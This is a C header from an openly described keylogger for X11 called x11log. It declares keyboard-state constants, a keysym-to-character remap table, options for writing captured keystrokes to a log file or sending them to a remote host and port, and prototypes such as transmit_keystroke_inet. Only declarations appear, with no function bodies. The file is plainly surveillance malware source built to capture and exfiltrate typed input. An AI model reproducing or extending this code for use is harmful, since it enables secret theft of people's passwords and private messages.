/* vim: set ts=4 sw=4: */
/* -- x11log.h
 * x11log - an unprivileged, userspace keylogger for X11
 *
 * This code is licensed under GPLv3.
 * (c) Erik Sonnleitner 2007/2011, es@delta-xi.net
 * www.delta-xi.net
 * */

#ifndef _X11LOG_H
#define _X11LOG_H

/* global defines */
#define MAX_KEYLEN			16
#define SHIFT_DOWN			1
#define LOCK_DOWN			2
#define CONTROL_DOWN		3
#define DELAY				10000

#define XKBD_WIDTH			32
#define BYTE_LENGTH			8
#define X_DEFAULT_DISPLAY	":0.0"

#define ERR_SOCKET			-1
#define ERR_CONNECT			-2

/* macros */
#define SWAP(a,b,c) c t;t=a;a=b;b=t;

/* structs */
struct opts_struct {
	char* logfile;			/* path to logfile */
	char* display;			/* X11 display, like $DISPLAY env variable */

	int   log_remote;		/* log to remote host? 0: no, 1: yes */
	char* remote_addr;		/* remote host to log to, as "hostname:port" */
	char* host;				/* hostname or IP as string */
	long  port;				/* port */

	int   silent;			/* no log to stdout */
};

/* globals */
const struct remap_struct {
	char src[20], dst[8];
} remap[] = {
	{"Return","\n"},
	{"escape","^["},
	{"delete", ">D"},
	{"shift",""},
	{"control",""},
	{"tab","\t"},
	{"space", " "},
	{"exclam", "!"},
	{"quotedbl", "\""},
	{"numbersign", "#"},
	{"dollar", "$"},
	{"percent", "%"},
	{"ampersand", "&"},
	{"apostrophe", "'"},
	{"parenleft", "("},
	{"parenright", ")"},
	{"asterisk", "*"},
	{"plus", "+"},
	{"comma", ","},
	{"minus", "-"},
	{"period", "."},
	{"slash", "/"},
	{"colon", ":"},
	{"semicolon", ";"},
	{"less", "<"},
	{"equal", "="},
	{"greater", ">"},
	{"question", "?"},
	{"at", "@"},
	{"bracketleft", "["},
	{"backslash", "\\"},
	{"bracketright", "]"},
	{"asciicircum", "^"},
	{"underscore", "_"},
	{"grave", "`"},
	{"braceleft", "{"},
	{"bar", "|"},
	{"braceright", "}"},
	{"asciitilde", "~"},
	{"odiaeresis","ö"},
	{"adiaeresis","ä"},
	{"udiaeresis","ü"},
	{"Odiaeresis","Ö"},
	{"Adiaeresis","Ä"},
	{"Udiaeresis","Ü"},
	{"ssharp","ß"},
	{"",""}
};

/* prototypes */
char*		decodeKey		(int code, int down, int mod);
int			getMods			(char *kbd);
int			getbit			(char *kbd, int idx);
void		signal_handler	(int sig);
void		fatal			(const char * msg);
struct tm*	initialize		(int argc, char ** argv, struct opts_struct* opts);
int			transmit_keystroke_inet(char* key, struct opts_struct *opts);
void		log				(int level, const char *fmt, ...);



#endif // _X11LOG_H

